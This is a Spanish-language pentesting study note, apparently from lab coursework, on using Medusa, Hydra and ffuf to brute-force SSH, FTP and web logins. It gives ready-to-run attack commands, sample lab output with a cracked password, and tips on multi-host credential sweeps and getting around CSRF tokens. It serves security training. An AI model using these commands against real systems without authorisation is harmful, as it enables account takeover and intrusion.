---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Brute-Forcing
Descripción: "Medusa es el primo de Hydra: cracker de logins paralelo, modular y rápido"
Fecha de actualización: 2026-06-23
Nota previa: "[[02 - Hydra]]"
Nota siguiente: "[[04 - Generación de wordlists]]"
Area: "[[Brute Forcing.base|Brute Forcing]]"
---
<mark style="background: #ADCCFFA6;">`Medusa` es el primo de [[02 - Hydra|Hydra]]: cracker de logins paralelo, modular y rápido.</mark> Hace lo mismo con flags distintos. Importa conocer los dos porque cada uno falla en cosas distintas, y porque para web ambos quedan por detrás de `ffuf` cuando hay tokens de por medio.

# Sintaxis de Medusa

```shell-session
$ medusa [opciones_target] [opciones_credenciales] -M módulo [opciones_módulo]
```

| Flag | Función |
| - | - |
| `-h HOST` / `-H file` | Un objetivo / lista de objetivos |
| `-u USER` / `-U file` | Un usuario / lista |
| `-p PASS` / `-P file` | Una contraseña / wordlist |
| `-M módulo` | `ssh`, `ftp`, `http`, `web-form`, `rdp`... |
| `-m "OPCIÓN"` | Opción específica del módulo |
| `-t N` | Logins en paralelo |
| `-f` / `-F` | Parar al primer acierto (host / global) |
| `-n PORT` | Puerto no estándar |
| `-e ns` | Probar password vacía (`n`) y password = usuario (`s`) |

<mark style="background: #FF5582A6;">`-e ns` es un chequeo de 10 segundos que vale oro</mark>: detecta cuentas con contraseña vacía o igual al usuario antes de lanzar ninguna wordlist. Primer disparo en cualquier servicio.

```shell-session
$ medusa -h IP -n PORT -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
ACCOUNT FOUND: [ssh] Host: IP User: sshuser Password: 1q2w3e4r5t [SUCCESS]
```
Desglosemos cada componente:
- `-h <IP>`: Especifica la dirección IP del sistema objetivo.
- `-n <PORT>`: Define el puerto en el que el servicio SSH está escuchando (generalmente el puerto 22).
- `-u sshuser`: Establece el nombre de usuario para el ataque de fuerza bruta.
- `-P 2023-200_most_used_passwords.txt`: Apunta a Medusa a una lista de palabras (*wordlist*).
- `-M ssh`: Selecciona el módulo `SSH` dentro de Medusa, <mark style="background: #FFB8EBA6;">adaptando el ataque específicamente para la autenticación [[SSH]]</mark>.
- `-t 3`: Indica el número de intentos de inicio de sesión paralelos que se ejecutarán simultáneamente. Aumentar este número puede acelerar el ataque, pero también <mark style="background: #FF5582A6;">puede aumentar la probabilidad de ser detectado o de activar medidas de seguridad en el sistema objetivo</mark>.

Para login web, el módulo `web-form`:

```shell-session
$ medusa -h www.example.com -U users.txt -P passwords.txt \
    -M web-form -m FORM:"username=^USER^&password=^PASS^:F=Invalid"
```

Donde Medusa brilla de verdad es en **multi-host** (`-H servers.txt`): barrer la misma credencial contra muchas máquinas a la vez en la fase de [[00 - Introducción al pivoting y los túneles|pivoting]] interno, tras comprometer un primer host.

# Hydra vs. Medusa

| | `Hydra` | `Medusa` |
| - | - | - |
| Multi-host | `-M targets.txt` | `-H` (más natural y rápido) |
| Login web | `http-post-form` (cómodo) | `web-form` (más verboso) |
| Estabilidad threads | A veces falsos negativos a `-t` alto | Más estable en paralelo |
| Tokens CSRF | No los gestiona | Tampoco |

<mark style="background: #FFB8EBA6;">La elección rara vez importa: ambos sirven para protocolos de red y formularios simples.</mark> El problema es que **ninguno** de los dos sabe leer un token `CSRF` rotativo ni seguir un flujo de varios pasos, que es justo lo que tiene cualquier login web moderno.

# Medusa para servicios web
<mark style="background: #ADCCFFA6;">Habiendo identificado el servidor [[📂🔄 FTP|FTP]], puedes proceder a aplicar fuerza bruta</mark> a su mecanismo de autenticación.

Si exploramos el directorio `/home` en el sistema objetivo, vemos una carpeta `ftpuser`, lo que implica la probabilidad de que el nombre de usuario del servidor FTP sea `ftpuser`. Basándonos en esto, podemos modificar nuestro comando de Medusa en consecuencia:
```shellsession
Kronno23@htb[/htb]$ medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5 

Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net> 

GENERAL: Parallel Hosts: 1 Parallel Logins: 5 
GENERAL: Total Hosts: 1 
GENERAL: Total Users: 1 
GENERAL: Total Passwords: 197 
... 
ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: ... Password: ... [SUCCESS]
... 
GENERAL: Medusa has finished.
```

Tras descifrar con éxito la contraseña de FTP, se puede establecer una conexión FTP:
```shellsession
Kronno23@htb[/htb]$ ftp ftp://ftpuser:<FTPUSER_PASSWORD>@localhost
```

# `ffuf`: el brute force de login web actual

Cuando el objetivo es un formulario [[HTTP]], <mark style="background: #FFB86CA6;">`ffuf` supera a Hydra/Medusa</mark>: es el mismo fuzzer que ya usas en [[15 - Introducción al web fuzzing|recon]], con control total sobre petición, cabeceras, modo de combinación y filtros de respuesta. Sin token, un ataque de usuario×contraseña (`clusterbomb`) es directo:

```shell-session
$ ffuf -request login.req -mode clusterbomb \
    -w users.txt:UF -w passwords.txt:PF \
    -fr 'Invalid credentials'
```

```shell-session
$ ffuf -u https://target/login -X POST \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'username=UF&password=PF' \
    -w users.txt:UF -w passwords.txt:PF -mode clusterbomb -fr 'Invalid'
```

- `-mode clusterbomb` prueba todas las combinaciones; `pitchfork` empareja líneas (para listas `user:pass` alineadas).
- `-fr 'Invalid'` filtra (oculta) las respuestas de fallo: lo que **no** se filtra es el candidato.
- `-fc 401 -mc 200,302` filtra/matchea por código — útil cuando el éxito es un redirect.

> [!important]+ El token CSRF: por qué a veces nada de esto basta
> Si el formulario lleva un token que cambia por petición, ni Hydra, ni Medusa, ni un `ffuf` ingenuo funcionan: todos mandan un token caduco. Las tres salidas profesionales:
> - **Burp Intruder / Turbo Intruder** con *recursive grep* que extrae el token de cada respuesta y lo reinyecta.
> - **`patator`**, que puede pedir la página, scrapear el token y enviarlo en la misma acción.
> - Un script con `requests.Session()`.
>
> El arsenal completo —`patator`, `ncrack`, Turbo Intruder, manejo de tokens— está en [[06 - Arsenal de herramientas para Brute Forcing]]. La evasión de rate limiting y lockout, en [[05 - Defensas y evasión]].

> [!info]+ Fuentes
> - [Medusa — repositorio oficial (jmk-foofus)](https://github.com/jmk-foofus/medusa)
> - [ffuf — Fuzz Faster U Fool](https://github.com/ffuf/ffuf) · [ffuf — login brute force](https://www.acceis.fr/brute-force-http-post-form-with-ffuf/)
